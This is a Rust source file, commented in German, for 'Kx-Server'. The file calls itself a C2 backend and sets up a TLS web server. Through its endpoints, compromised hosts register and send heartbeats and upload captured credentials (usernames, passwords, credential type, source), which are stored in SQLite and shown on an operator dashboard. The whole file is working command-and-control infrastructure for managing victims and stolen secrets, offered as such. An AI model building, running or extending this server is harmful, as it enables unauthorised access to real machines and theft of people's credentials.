//! Kx-Server: C2-Backend mit Host-Registry, Secrets-Storage und Dashboard.
//!
//! Startet einen TLS-gesicherten axum-Server, der kompromittierte Hosts,
//! erbeutete Secrets und Tasks persistiert. Die API ist mit einem
//! Bearer-Token geschützt; das Dashboard wird unter `/` ausgeliefert.

mod auth;
mod dashboard;
mod db;

use std::net::{SocketAddr, ToSocketAddrs};
use std::path::PathBuf;
use std::sync::Arc;

use axum::{
    extract::{Json, State},
    http::StatusCode,
    response::{Html, IntoResponse},
    routing::{get, post},
    Router,
};
use axum_server::tls_rustls::RustlsConfig;
use clap::Parser;
use db::{Db, Host, Secret};
use uuid::Uuid;

/// Zeigt die API-Endpunkte an.
const HELP: &str = "POST /api/register   Host registrieren\n\
                    POST /api/heartbeat   Host-Heartbeat senden\n\
                    POST /api/secrets     Secret hochladen\n\
                    GET  /api/hosts       Alle Hosts\n\
                    GET  /api/secrets     Alle Secrets\n\
                    GET  /api/tasks       Alle Tasks";

#[derive(Parser)]
#[command(name = "kx-server", about = "Kx-C2-Backend")]
struct Cli {
    /// Bind-Adresse des Servers.
    #[arg(long, default_value = "127.0.0.1")]
    host: String,
    /// Port des Servers.
    #[arg(long, default_value_t = 8443)]
    port: u16,
    /// Pfad zur SQLite-Datenbank.
    #[arg(long, default_value = "kx.db")]
    db: PathBuf,
    /// Bearer-Token für die API (leer => zufällig erzeugen).
    #[arg(long, env = "KX_SERVER_TOKEN")]
    token: Option<String>,
    /// Common Name für das selbstsignierte Zertifikat.
    #[arg(long, default_value = "kx.local")]
    cn: String,
}

/// Server-Zustand: Datenbank und Auth-Token.
#[derive(Clone)]
struct AppState {
    db: Arc<Db>,
    token: String,
}

/// Request: Host-Registrierung.
#[derive(serde::Deserialize)]
struct RegisterReq {
    ip: String,
    hostname: Option<String>,
    os: Option<String>,
    status: Option<String>,
}

/// Request: Heartbeat.
#[derive(serde::Deserialize)]
struct HeartbeatReq {
    host_id: String,
}

/// Request: Secret-Upload.
#[derive(serde::Deserialize)]
struct SecretReq {
    host_id: String,
    cred_type: String,
    username: String,
    password: String,
    source: Option<String>,
}

/// Registriert einen Host (id = IP für stabile Updates).
async fn register(
    _auth: auth::Authenticated,
    State(st): State<AppState>,
    Json(req): Json<RegisterReq>,
) -> impl IntoResponse {
    let now = kx_core::util::now_rfc3339();
    let host = Host {
        id: req.ip.clone(),
        ip: req.ip,
        hostname: req.hostname.unwrap_or_default(),
        os: req.os.unwrap_or_default(),
        status: req.status.unwrap_or_else(|| "discovered".into()),
        first_seen: now.clone(),
        last_seen: now,
    };
    match st.db.upsert_host(&host) {
        Ok(()) => StatusCode::CREATED.into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Aktualisiert das Last-Seen eines Hosts.
async fn heartbeat(
    _auth: auth::Authenticated,
    State(st): State<AppState>,
    Json(req): Json<HeartbeatReq>,
) -> impl IntoResponse {
    let hosts = match st.db.list_hosts() {
        Ok(h) => h,
        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    };
    if let Some(h) = hosts.into_iter().find(|h| h.id == req.host_id) {
        let mut h = h;
        h.last_seen = kx_core::util::now_rfc3339();
        if st.db.upsert_host(&h).is_ok() {
            StatusCode::OK.into_response()
        } else {
            StatusCode::INTERNAL_SERVER_ERROR.into_response()
        }
    } else {
        StatusCode::NOT_FOUND.into_response()
    }
}

/// Speichert ein hochgeladenes Secret.
async fn upload_secret(
    _auth: auth::Authenticated,
    State(st): State<AppState>,
    Json(req): Json<SecretReq>,
) -> impl IntoResponse {
    let secret = Secret {
        id: Uuid::new_v4().to_string(),
        host_id: req.host_id,
        cred_type: req.cred_type,
        username: req.username,
        password: req.password,
        source: req.source.unwrap_or_default(),
        collected_at: kx_core::util::now_rfc3339(),
    };
    match st.db.insert_secret(&secret) {
        Ok(()) => StatusCode::CREATED.into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Hosts als JSON.
async fn list_hosts(_auth: auth::Authenticated, State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_hosts() {
        Ok(h) => Json(h).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Secrets als JSON.
async fn list_secrets(_auth: auth::Authenticated, State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_secrets() {
        Ok(s) => Json(s).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Tasks als JSON.
async fn list_tasks(_auth: auth::Authenticated, State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_tasks() {
        Ok(t) => Json(t).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert das HTML-Dashboard (ohne Auth, Token via URL-Parameter).
async fn dashboard() -> impl IntoResponse {
    Html(dashboard::DASHBOARD_HTML)
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "kx_server=info".into()),
        )
        .init();

    let cli = Cli::parse();

    // Token bestimmen: CLI > Env > zufällig.
    let cli_token_provided = cli.token.is_some();
    let token = cli
        .token
        .or_else(|| std::env::var("KX_SERVER_TOKEN").ok())
        .unwrap_or_else(|| Uuid::new_v4().to_string());
    if !cli_token_provided {
        eprintln!("Kx-Server: kein Token gesetzt, verwende generiertes: {token}");
    }
    // auth.rs liest das Token aus der Environment-Variable.
    std::env::set_var("KX_SERVER_TOKEN", &token);

    let db = Db::open(&cli.db).expect("Datenbank nicht erreichbar");
    let state = AppState {
        db: Arc::new(db),
        token: token.clone(),
    };

    // TLS-Material: selbstsigniert generieren.
    let tls = kx_tls::generate_server_tls(&cli.cn).expect("TLS-Zertifikat erzeugbar");
    let cert_pem = tls.cert_pem.clone();
    let key_pem = tls.key_pem;

    let app = Router::new()
        .route("/", get(dashboard))
        .route("/api/register", post(register))
        .route("/api/heartbeat", post(heartbeat))
        .route("/api/secrets", post(upload_secret))
        .route("/api/hosts", get(list_hosts))
        .route("/api/secrets", get(list_secrets))
        .route("/api/tasks", get(list_tasks))
        .with_state(state);

    let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
        .to_socket_addrs()
        .expect("Bind-Adresse auflösbar")
        .next()
        .expect("Bind-Adresse vorhanden");

    let config = RustlsConfig::from_pem(cert_pem, key_pem)
        .await
        .expect("TLS-Config");

    tracing::info!("Kx-Server lauscht auf https://{} (API: {HELP})", addr);
    axum_server::bind_rustls(addr, config)
        .serve(app.into_make_service())
        .await
        .expect("Server-Loop");
}
